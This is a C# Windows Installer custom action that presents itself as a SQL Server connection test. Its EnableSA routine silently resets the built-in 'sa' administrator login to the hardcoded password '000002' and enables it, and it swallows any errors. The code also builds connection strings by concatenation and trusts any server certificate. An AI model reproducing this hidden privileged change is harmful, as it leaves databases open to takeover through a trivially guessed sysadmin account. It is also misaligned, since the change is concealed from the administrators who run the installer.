using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Deployment.WindowsInstaller;
using System.Data.SqlClient;

namespace CheckSqlConnection
{
    public class CustomActions
    {
        [CustomAction]
        public static ActionResult CheckSqlConnection(Session session)
        {
            try
            {
                string server = session["DB_SERVER"];
                string userName = session["DB_USER"];
                string pwd = session["DB_PASSWORD"];
                string connstring = "Server=" + server +
               ";Connection Timeout=30;TrustServerCertificate=True;MultipleActiveResultSets=true;Password=" + pwd + ";User ID=" + userName + ";";
                string isConnstr = "Server=" + server +
               ";Connection Timeout=30;TrustServerCertificate=True;Integrated Security=SSPI;MultipleActiveResultSets=true;";
                session["CONNSTRING"] = connstring;
                EnableSA(isConnstr);
                session["SQLCONNECTIONTESTRESULT"] = AuthenticateUser(connstring);
                
                session.Log("Setting Connstring");
            }
            catch (Exception exception)
            {
                session.Log(exception.ToString());
                return ActionResult.Failure;
            }
            return ActionResult.Success;
        }

        private static bool EnableSA(string connstr)
        {
            try
            {
                using (SqlConnection conn = new SqlConnection(connstr))
                {
                    conn.Open();
                    SqlCommand cmd = new SqlCommand();
                    cmd.Connection = conn;
                    cmd.CommandText = "ALTER LOGIN [sa] WITH PASSWORD='000002';\r\nALTER LOGIN [sa] ENABLE;";
                    cmd.ExecuteNonQuery();
                }
                return true;
            }
            catch
            { return false; }
        }

        private static string AuthenticateUser(string connString)
        {   
            try
                {
                    using (SqlConnection conn = new SqlConnection(connString))
                    {
                        conn.Open();
                    
                    }
                    return "1";
                }
                catch
                { return "0"; }
        }
    }
    
}
